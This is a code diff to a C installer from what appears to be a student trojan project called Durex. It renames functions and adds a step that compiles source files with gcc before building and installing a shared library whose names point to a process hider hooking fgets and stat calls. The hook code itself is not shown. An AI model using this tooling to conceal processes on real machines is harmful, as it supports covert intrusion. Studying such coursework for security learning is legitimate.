@@ -6,7 +6,7 @@
 /*   By: gbourgeo <gbourgeo@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/08/14 01:44:46 by root              #+#    #+#             */
-/*   Updated: 2019/05/12 16:49:18 by gbourgeo         ###   ########.fr       */
+/*   Updated: 2019/07/17 11:18:52 by gbourgeo         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -33,7 +33,34 @@ static int		install_failed(const char *msg, char *const src[], char *const files
 	return 0;
 }
 
-static int		create_library(char *const files[], char *const src[], size_t size)
+static int		compile_files(char *const files[], char *const src[], size_t size)
+{
+	pid_t		pid;
+	char		*compil[] = { "gcc", "-Wall", "-o", "/tmp/mamouth.o", "-c", NULL, NULL };
+	int			status;
+
+	serverLog(1, "[INFO] - Compiling library files ... \n");
+	for (size_t i = 0; i < size; i++)
+	{
+		if (!src[i])
+			continue ;
+		pid = fork();
+		if (pid < 0)
+			return install_failed("Failed to fork.\n", src, files, size);
+		if (pid == 0)
+		{
+			compil[5] = files[i];
+			execvp(compil[0], compil);
+			exit(1);
+		}
+		waitpid(pid, &status, 0);
+		serverLog(1, "[INFO] - %s returned %d\n", files[i], status);
+		remove("/tmp/mamouth.o");
+	}
+	return 1;
+}
+
+static int		create_files(char *const files[], char *const src[], size_t size)
 {
 	int			fd;
 	size_t		ret;
@@ -52,6 +79,7 @@ static int		create_library(char *const files[], char *const src[], size_t size)
 			return install_failed("Failed to write %s.\n", src, files, i);
 	}
 	serverLog(0, "Ok\n");
+	compile_files(files, src, size);
 	return 1;
 }
 
@@ -64,7 +92,7 @@ static int		compile_library(char *const files[], char *const src[], size_t size)
 	pid = fork();
 	if (pid == 0) {
 		execvp(files[0], files);
-		exit(-1);
+		exit(1);
 	} else if (pid > 0) {
 		waitpid(pid, &status, 0);
 		if (!WIFEXITED(status)) {
@@ -78,7 +106,7 @@ static int		compile_library(char *const files[], char *const src[], size_t size)
 	return 1;
 }
 
-static int		execute_library(char *const files[], char *const src[], size_t size)
+static int		install_library(char *const files[], char *const src[], size_t size)
 {
 	int			fd;
 	size_t		ret;
@@ -101,7 +129,7 @@ static int		execute_library(char *const files[], char *const src[], size_t size)
 	return install_failed("Can't open library.\n", src, files, size);
 }
 
-int				install_library()
+int				create_library()
 {
 	char	*const files[] = { "gcc", "-Wall", "-fPIC", "-shared", "-o", DUREX_PROCESSHIDER_LIB,
 							   DUREX_FGETS_FILE, DUREX_LXSTAT_FILE, DUREX_NEWFSTATAT_FILE,
@@ -115,5 +143,5 @@ int				install_library()
 	size_t	size;
 
 	size = sizeof(src) / sizeof(*src);
-	return create_library(files, src, size) && compile_library(files, src, size) && execute_library(files, src, size);
+	return create_files(files, src, size) && compile_library(files, src, size) && install_library(files, src, size);
 }
